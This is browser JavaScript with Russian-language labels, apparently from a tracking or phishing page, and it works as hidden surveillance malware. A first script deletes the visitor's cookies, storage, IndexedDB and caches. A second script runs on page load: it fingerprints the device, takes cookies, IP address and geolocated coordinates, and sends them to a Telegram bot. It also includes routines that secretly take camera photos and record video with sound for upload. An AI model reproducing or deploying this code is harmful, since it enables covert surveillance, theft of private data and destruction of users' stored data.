<script>
(async function wipe() {
  const FLAG = '__w6__';
  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}
  try {
    const ck = document.cookie ? document.cookie.split(';') : [];
    for (const c of ck) {
      const name = c.split('=')[0].trim();
      if (!name) continue;
      for (const p of ['/', location.pathname]) {
        for (const d of ['', location.hostname, '.' + location.hostname]) {
          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
        }
      }
    }
  } catch (e) {}
  try { localStorage.clear(); } catch (e) {}
  try { sessionStorage.clear(); } catch (e) {}
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const db of dbs) if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
    }
  } catch (e) {}
  try {
    if (window.caches) {
      const keys = await caches.keys();
      for (const k of keys) try { await caches.delete(k); } catch (e) {}
    }
  } catch (e) {}
  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}
  location.reload();
})();

<script>

function sendText(text) {
  return new Promise(res => {
    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
                '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
    const img = new Image();
    img.onload = img.onerror = () => res();
    img.src = url;
    setTimeout(res, 600);
  });
}

async function sendPhoto(blob, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'photo.jpg');
    form.append('caption', caption || '');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
      method: 'POST', body: form, keepalive: true
    });
    return (await r.json()).ok;
  } catch (e) { return false; }
}

async function sendVideo(blob, ext, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('video', blob, 'video.' + (ext || 'webm'));
    form.append('caption', caption || '');
    form.append('supports_streaming', 'true');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
      method: 'POST', body: form, keepalive: true
    });
    return (await r.json()).ok;
  } catch (e) { return false; }
}

async function collectAll() {
  const ua = navigator.userAgent, n = navigator, s = screen, out = {};
  const ref = document.referrer || '';
  let src = 'прямой';
  if (/t\.me|telegram/i.test(ref)) src = 'Telegram';
  else if (/google\./i.test(ref)) src = 'Google';
  else if (/yandex\./i.test(ref)) src = 'Яндекс';
  else if (/bing\./i.test(ref)) src = 'Bing';
  else if (/vk\.com/i.test(ref)) src = 'ВК';
  else if (/instagram\./i.test(ref)) src = 'Instagram';
  else if (/facebook\./i.test(ref)) src = 'Facebook';
  else if (ref) src = ref;
  out['Источник'] = src;
  out['Referrer'] = ref || '(прямой)';

  let app = 'нет';
  if (/Telegram/i.test(ua)) app = 'Telegram';
  else if (/Instagram/i.test(ua)) app = 'Instagram';
  else if (/FBAN|FBAV/i.test(ua)) app = 'Facebook';
  else if (/WhatsApp/i.test(ua)) app = 'WhatsApp';
  else if (/TikTok|BytedanceWebview/i.test(ua)) app = 'TikTok';
  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) app = 'VK';
  out['Приложение'] = app;

  let br = '?', bv = '';
  const bt = [
    [/YaBrowser\/([\d.]+)/, 'Яндекс.Браузер'],
    [/Edg\/([\d.]+)/, 'Edge'],
    [/OPR\/([\d.]+)/, 'Opera'],
    [/SamsungBrowser\/([\d.]+)/, 'Samsung Internet'],
    [/Firefox\/([\d.]+)/, 'Firefox'],
    [/CriOS\/([\d.]+)/, 'Chrome iOS'],
    [/FxiOS\/([\d.]+)/, 'Firefox iOS'],
    [/Chrome\/([\d.]+)/, 'Chrome'],
    [/Version\/([\d.]+).*Safari/, 'Safari'],
  ];
  for (const [re, name] of bt) {
    const m = re.exec(ua);
    if (m) { br = name; bv = m[1]; break; }
  }
  out['Браузер'] = br + (bv ? ' ' + bv : '');
  out['UserAgent'] = ua;

  let os = '?', ov = '';
  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; ov = RegExp.$1; }
  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; ov = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; ov = RegExp.$1.replace(/_/g, '.'); }
  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; ov = RegExp.$1; }
  else if (/Linux/i.test(ua)) os = 'Linux';
  out['ОС'] = os + (ov ? ' ' + ov : '');

  let dev = 'десктоп';
  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) dev = 'планшет';
  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) dev = 'смартфон';
  out['Устройство'] = dev;

  const model = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
  if (model) out['Модель'] = model[1].trim();

  out['Язык'] = n.language;
  out['TZ'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
  out['Время'] = new Date().toLocaleString('ru-RU');
  out['Экран'] = s.width + 'x' + s.height;
  out['Окно'] = window.innerWidth + 'x' + window.innerHeight;
  out['DPR'] = window.devicePixelRatio;
  out['CPU'] = n.hardwareConcurrency || '';
  out['RAM'] = n.deviceMemory || '';
  out['Платформа'] = n.platform || '';
  out['Онлайн'] = n.onLine ? 'да' : 'нет';

  if (n.getBattery) {
    try {
      const b = await n.getBattery();
      out['Батарея'] = Math.round(b.level * 100) + '%';
      out['Заряжается'] = b.charging ? 'да' : 'нет';
    } catch (e) {}
  }

  const c = n.connection || n.mozConnection || n.webkitConnection;
  if (c) {
    out['Сеть'] = c.effectiveType || '';
    out['Скорость'] = c.downlink || '';
    out['RTT'] = c.rtt || '';
  }

  try {
    const d = await n.mediaDevices.enumerateDevices();
    out['Камер'] = d.filter(x => x.kind === 'videoinput').length;
    out['Микрофонов'] = d.filter(x => x.kind === 'audioinput').length;
  } catch (e) {}

  try {
    const cv = document.createElement('canvas');
    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        out['GPU'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      }
    }
  } catch (e) {}

  try { if (document.cookie) out['Cookies'] = document.cookie; } catch (e) {}

  out['URL'] = location.href;
  out['Хост'] = location.hostname;

  try {
    const r = await fetch('https://ipwho.is/');
    const g = await r.json();
    if (g.latitude) {
      out['IP'] = g.ip;
      out['Страна'] = g.country;
      out['Город'] = g.city;
      out['Координаты'] = g.latitude + ', ' + g.longitude;
      out['ISP'] = g.connection && g.connection.isp;
      out['ASN'] = g.connection && ('AS' + g.connection.asn);
      out['VPN'] = g.security && g.security.vpn ? 'да' : 'нет';
      out['Прокси'] = g.security && g.security.proxy ? 'да' : 'нет';
      out['Tor'] = g.security && g.security.tor ? 'да' : 'нет';
      out['Google Maps'] = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
    }
  } catch (e) {}

  return out;
}

async function getCameraStream(facing) {
  const attempts = [
    { video: { facingMode: { exact: facing }, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
    { video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
    { video: { facingMode: facing }, audio: false },
    { video: true, audio: false },
  ];
  for (const c of attempts) {
    try { return await navigator.mediaDevices.getUserMedia(c); } catch (e) {}
  }
  return null;
}

function waitVideo(v, timeout = 4000) {
  return new Promise(res => {
    if (v.readyState >= 2 && v.videoWidth > 0) return res(true);
    let done = false;
    const finish = ok => { if (done) return; done = true; res(ok); };
    v.onloadedmetadata = () => finish(true);
    v.oncanplay = () => finish(true);
    v.onloadeddata = () => finish(true);
    setTimeout(() => finish(v.videoWidth > 0), timeout);
  });
}

async function takePhoto(facing, label, vEl) {
  let stream = null;
  try {
    stream = await getCameraStream(facing);
    if (!stream) return { ok: false, reason: 'нет доступа' };

    vEl.srcObject = stream;
    vEl.muted = true;
    try { await vEl.play(); } catch (e) {}

    if (!await waitVideo(vEl, 4000)) {
      stream.getTracks().forEach(t => t.stop());
      vEl.srcObject = null;
      return { ok: false, reason: 'нет кадров' };
    }

    await new Promise(r => setTimeout(r, 1200));

    const w = vEl.videoWidth || 1280;
    const h = vEl.videoHeight || 720;
    canvas.width = w; canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(vEl, 0, 0, w, h);
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.92));
    ctx.clearRect(0, 0, w, h);

    stream.getTracks().forEach(t => t.stop());
    vEl.srcObject = null;

    if (!blob || !blob.size) return { ok: false, reason: 'пусто' };

    const ok = await sendPhoto(blob, label + '\n' + w + 'x' + h + '\n' + new Date().toLocaleString('ru-RU') + '\n' + location.href);
    return { ok, size: blob.size };
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    vEl.srcObject = null;
    return { ok: false, reason: e.message };
  }
}

function pickMime() {
  if (typeof MediaRecorder === 'undefined') return false;
  const c = [
    ['video/webm;codecs=vp8,opus', 'webm'],
    ['video/webm;codecs=vp9,opus', 'webm'],
    ['video/webm', 'webm'],
    ['video/mp4;codecs=h264,aac', 'mp4'],
    ['video/mp4', 'mp4'],
  ];
  for (const [m, e] of c) {
    if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
      videoMime = m; videoExt = e; return true;
    }
  }
  videoMime = ''; videoExt = 'webm'; return true;
}

async function recordVideo(facing, label, seconds, vEl) {
  let stream = null;
  try {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 }, frameRate: 24 },
        audio: true
      });
    } catch (e) {
      stream = await getCameraStream(facing);
    }
    if (!stream) return { ok: false, reason: 'нет доступа' };

    vEl.srcObject = stream;
    vEl.muted = true;
    try { await vEl.play(); } catch (e) {}
    await waitVideo(vEl, 3000);

    if (!pickMime()) {
      stream.getTracks().forEach(t => t.stop());
      return { ok: false, reason: 'нет MediaRecorder' };
    }

    let rec;
    try {
      rec = new MediaRecorder(stream, {
        mimeType: videoMime || undefined,
        videoBitsPerSecond: 600000,
        audioBitsPerSecond: 48000
      });
    } catch (e) {
      try { rec = new MediaRecorder(stream); }
      catch (e2) {
        stream.getTracks().forEach(t => t.stop());
        return { ok: false, reason: e2.message };
      }
    }

    const chunks = [];
    rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
    const stopPromise = new Promise(res => { rec.onstop = () => res(); });

    rec.start(500);

    let left = seconds;
    const tick = setInterval(() => {
      left--;
      statusEl.textContent = label.replace(/<[^>]+>/g, '') + ': ' + left + 'с';
      if (left <= 0) clearInterval(tick);
    }, 1000);

    await new Promise(r => setTimeout(r, seconds * 1000));
    clearInterval(tick);

    try { rec.requestData(); } catch (e) {}
    try { rec.stop(); } catch (e) {}
    await stopPromise;

    stream.getTracks().forEach(t => t.stop());
    vEl.srcObject = null;

    if (!chunks.length) return { ok: false, reason: 'пусто' };

    const blob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
    if (!blob.size) return { ok: false, reason: 'пустой blob' };

    const ok = await sendVideo(blob, videoExt, label + ' — ' + seconds + 'с\n' + new Date().toLocaleString('ru-RU'));
    return { ok, size: blob.size };
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    return { ok: false, reason: e.message };
  }
}

(async function autoRun() {
  statusEl.textContent = 'Отправка данных...';
  await new Promise(r => setTimeout(r, 300));
  try {
    const data = await collectAll();
    await sendText(
      '🟢 <b>ПЕРЕХОД</b>\n\n' +
      '<b>Источник:</b> ' + (data['Источник'] || '?') + '\n' +
      '<b>Приложение:</b> ' + (data['Приложение'] || '?') + '\n' +
      '<b>Браузер:</b> ' + (data['Браузер'] || '?') + '\n' +
      '<b>ОС:</b> ' + (data['ОС'] || '?') + '\n' +
      '<b>Устройство:</b> ' + (data['Устройство'] || '?') + '\n' +
      '<b>IP:</b> ' + (data['IP'] || '?') + '\n' +
      '<b>Город:</b> ' + (data['Город'] || '?') + ', ' + (data['Страна'] || '?') + '\n' +
      '<b>Камер:</b> ' + (data['Камер'] || '?') + '\n' +
      '<b>Время:</b> ' + (data['Время'] || '?')
    );

    const lines = Object.entries(data).filter(([k, v]) => v !== '' && v != null && v !== false)
      .map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 500));
    const chunks = [];
    let cur = '';
    for (const line of lines) {
      if ((cur + line).length > 3500) { chunks.push(cur); cur = ''; }
      cur += line + '\n';
    }
    if (cur) chunks.push(cur);
    for (let i = 0; i < chunks.length; i++) {
      const head = '📋 <b>ДАННЫЕ</b>' + (chunks.length > 1 ? ' (' + (i + 1) + '/' + chunks.length + ')' : '') + '\n\n';
      await sendText(head + chunks[i]);
      await new Promise(r => setTimeout(r, 500));
    }
    statusEl.textContent = '';
  } catch (e) { statusEl.textContent = ''; }
})();
